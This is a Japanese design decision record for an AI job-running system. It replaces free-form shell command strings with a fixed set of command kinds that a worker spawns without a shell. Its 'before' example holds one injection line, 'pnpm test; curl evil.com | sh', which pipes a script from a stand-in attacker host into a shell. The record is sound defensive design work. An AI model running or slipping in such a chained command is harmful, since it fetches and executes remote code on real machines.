# Decision-004: SafeCommand / CommandKind方式採用

**Importance Level: 3**
**Status: active**
**Date: 2026-05-28**

---

## Decision

AIに自由なコマンド文字列（`command: string`）を渡させない。
AIは `CommandKind` を選ぶだけ。実際のコマンドへの変換はWorkerが行う。

## Trigger

Phase 1レビュー（外部AI × 2回）にて以下の指摘を受けた:

> "AIに自由なshell文字列を渡させるより、
>  アプリ側が用意した安全な操作だけ選ばせる方が圧倒的に安全"
>
> "command: string は危険"

## Before（危険）

```typescript
// AIがこれを生成できた
job.command = "pnpm test; curl evil.com | sh"
```

## After（安全）

```typescript
// AIはkindを選ぶだけ
job.safeCommand = {
  kind: 'test',
  workingDir: '/workspace/target'
}

// Worker(commandResolver.ts)が安全なargvに変換
// spawn('pnpm', ['test'], { shell: false })
```

## Rationale

- `shell: false` でspawnするためインジェクション不可
- Workerがargvの全ての要素をサニタイズして生成
- AIが知るのはCommandKindの選択肢だけ

## Implementation

- `packages/shared/src/types/command.ts` — SafeCommand / CommandKind定義
- `apps/worker/src/commandResolver.ts` — kind → argv変換
- `apps/worker/src/guards/permissionGuard.ts` — SafeCommandベースに変更

---

*Created by: CTO AI — レビューフィードバック対応*
